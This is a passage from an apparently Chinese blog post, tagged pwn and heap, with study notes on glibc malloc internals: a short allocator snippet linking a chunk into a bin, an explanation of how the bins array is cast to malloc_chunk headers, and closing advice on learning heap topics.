class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mark_bin (av, victim_index);  <span class="comment">//chunk有属于这个标号的,那最后这个bin总不会为空对吧</span></span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>在unsortedbin中取chunk时,最后将该chunk插入的操作</p><h2 id="困惑"><a href="#困惑" class="headerlink" title="困惑"></a>困惑</h2><details class="folding-tag" green><summary> bins数组的双向链表是如何实现的[已解决] </summary>              <div class='content'>              <p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-16_231042.png" alt=""></p><p>从上图可以看到，每个small bin使用了bins array中的两个元素，以0、1、2、3四个元素为例，<strong><em>代码中把这部分空间强制转换成malloc_chunk类型</em></strong>，这样根据malloc_chunk数据结构的定义，3、4两个元素就对应了malloc_chunk中的fd、bk指针，它们作为第一个small bin的表头，分别用来指向forward和backward方向的malloc_chunk，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-16_230420.png" alt=""></p><p>强制类型转换真的很重要</p>              </div>            </details><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>最后，堆的学习着实需要耐心，本人就是中途无数次摆烂，还总是被各种细节困惑，但只要坚持总是能入门的，另外有时遇到不懂又搜不到的知识点，不妨问问chatgpt或newbing之类的ai，虽然基本十个错九个（主要是gpt，bing不懂的它不会瞎答），但总是能给个方向。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
